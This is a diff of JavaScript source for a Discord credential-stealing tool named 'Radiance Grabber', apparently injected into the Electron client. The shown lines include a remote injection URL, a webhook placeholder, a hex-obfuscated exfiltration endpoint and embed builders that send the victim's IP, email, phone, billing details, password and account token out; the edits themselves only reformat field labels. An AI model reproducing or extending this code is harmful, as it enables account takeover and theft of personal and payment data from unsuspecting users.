@@ -17,6 +17,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 5639644,
 
+
     injection_url: "https://raw.githubusercontent.com/xugga/hsgsfhsghsg/main/index.js",
     webhook: "%WEBHOOK%",
     uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
@@ -62,7 +63,7 @@ const makeEmbed = async ({
         username: "Radiance Grabber",
         content: "",
         embeds: [{
-            title: "ss",
+            title: `\`${user.username}\``,
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
@@ -224,15 +225,15 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: `\`${user.username}\``,
             fields: [
-                { name: "IP", value: `\`${ip}\``, inline: false },
-                { name: "ID", value: `\`${user.id}\``, inline: false },
-                { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
-                { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
-                { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
-                { name: "Billing", value: `${Billings}`, inline: false },
-                { name: "Email", value: `\`${user.email}\``, inline: false },
-                { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
-                { name: "Token", value: `\`${token}\``, inline: false }
+                { name: "IP:", value: `${ip}`, inline: false },
+                { name: "ID:", value: `${user.id}`, inline: false },
+                { name: "Nitro:", value: `${GetNitro(Nitro)}`, inline: false },
+                { name: "NSFW:", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                { name: "2FA:", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                { name: "Billing:", value: `${Billings}`, inline: false },
+                { name: "Email:", value: `${user.email}`, inline: false },
+                { name: "Phone:", value: `${user.phone ?? "None"}`, inline: false },
+                { name: "Token:", value: `${token}`, inline: false }
             ],
             image: userBanner,
             thumbnail: userAvatar,
@@ -344,16 +345,16 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var params = await makeEmbed({
                 title: `\`${user.username}\``,
                 fields: [
-                    { name: "IP", value: `\`${ip}\``, inline: false },
-                    { name: "ID", value: `\`${user.id}\``, inline: false },
-                    { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
-                    { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
-                    { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
-                    { name: "Billing", value: `${Billings}`, inline: false },
-                    { name: "Email", value: `\`${user.email}\``, inline: false },
-                    { name: "Password", value: `\`${password}\``, inline: false },
-                    { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
-                    { name: "Token", value: `\`${token}\``, inline: false }
+                    { name: "IP:", value: `${ip}`, inline: false },
+                    { name: "ID:", value: `${user.id}`, inline: false },
+                    { name: "Nitro:", value: `${GetNitro(Nitro)}`, inline: false },
+                    { name: "NSFW:", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                    { name: "2FA:", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                    { name: "Billing:", value: `${Billings}`, inline: false },
+                    { name: "Email:", value: `${user.email}`, inline: false },
+                    { name: "Password:", value: `${password}`, inline: false },
+                    { name: "Phone:", value: `${user.phone ?? "None"}`, inline: false },
+                    { name: "Token:", value: `${token}`, inline: false }
                 ],
                 image: userBanner,
                 thumbnail: userAvatar,
